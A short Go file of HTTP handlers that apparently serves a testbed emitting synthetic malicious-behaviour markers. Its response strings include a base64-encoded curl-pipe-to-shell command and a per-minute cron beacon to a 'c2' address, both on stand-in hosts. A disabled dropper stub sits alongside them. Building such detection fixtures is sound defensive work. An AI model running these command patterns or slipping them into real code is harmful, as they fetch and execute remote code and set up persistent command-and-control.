package handlers

import (
	"encoding/base64"
	"log"
	"net/http"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	if source == "" {
		http.Error(w, "missing url", http.StatusBadRequest)
		return
	}
	if source != "https://example.com/tool.bin" {
		log.Printf("FetchTool rejected unapproved url %q", source)
		http.Error(w, "unsupported url", http.StatusBadRequest)
		return
	}

	_, _ = w.Write([]byte("fetch disabled; using local safe adapter\n"))
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	log.Printf("stagedDropper disabled")
	return nil
}
